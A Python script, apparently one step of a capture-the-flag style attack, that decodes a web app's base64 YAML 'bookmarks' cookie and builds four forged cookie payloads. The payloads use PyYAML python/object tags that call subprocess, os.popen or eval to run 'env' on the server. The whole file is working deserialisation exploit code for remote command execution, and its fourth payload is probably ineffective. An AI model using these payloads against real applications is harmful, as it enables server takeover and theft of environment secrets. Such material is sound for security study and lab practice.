import base64

# Decode the original bookmarks cookie to understand the format
original_cookie = "LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiB0ZXN0CiAgdXJsOiBodHRwOi8vZXhhbXBsZS5jb20K"

decoded = base64.b64decode(original_cookie).decode()
print("[*] Original bookmarks cookie decoded:")
print(decoded)
print("\n" + "="*60 + "\n")

# The format shows it's a YAML list with an object
# Let's craft payloads following this exact format

# Payload 1: Using subprocess in proper YAML format
payload1 = """- !!python/object/apply:subprocess.check_output
  args: [['env']]
"""

print("[*] Payload 1 (subprocess.check_output):")
print(payload1)
encoded1 = base64.b64encode(payload1.encode()).decode()
print(f"Encoded: {encoded1}\n")

# Payload 2: Using os.popen
payload2 = """- !!python/object/apply:os.popen
  args: ['env']
"""

print("[*] Payload 2 (os.popen):")
print(payload2)
encoded2 = base64.b64encode(payload2.encode()).decode()
print(f"Encoded: {encoded2}\n")

# Payload 3: Using eval with subprocess
payload3 = """- !!python/object/apply:eval
  args: ["__import__('subprocess').getoutput('env')"]
"""

print("[*] Payload 3 (eval with getoutput):")
print(payload3)
encoded3 = base64.b64encode(payload3.encode()).decode()
print(f"Encoded: {encoded3}\n")

# Payload 4: Custom object that executes command
payload4 = """- !!python/object/new:str
  args: []
  state: !!python/tuple
    - "__import__('subprocess').getoutput('env')"
"""

print("[*] Payload 4 (custom object):")
print(payload4)
encoded4 = base64.b64encode(payload4.encode()).decode()
print(f"Encoded: {encoded4}\n")

print("[*] Payloads prepared. Testing in next step...")

